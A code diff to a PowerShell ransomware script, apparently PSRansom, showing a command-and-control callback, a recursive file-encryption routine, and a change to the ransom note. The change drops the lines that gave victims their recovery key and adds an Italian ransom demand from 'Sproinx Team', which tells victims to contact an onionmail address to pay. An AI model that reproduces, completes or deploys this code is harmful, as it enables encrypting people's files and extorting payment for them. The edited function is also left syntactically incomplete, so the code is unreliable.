@@ -283,10 +283,8 @@ function SendOK {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
 
 function CreateReadme {
-   $ReadmeTXT = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
-   if (!(Test-Path "$Directory$slash$Readme")) { Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
-   Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }}
-
+   $ReadmeTXT = "Sei stato attaccato da Sproinx Team ;-; contatta greensmerald@onionmail.org per avere informazioni su come effettuare il pagamento e riavere i tuoi dati ;-)"
+   
 function EncryptFiles { 
    $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
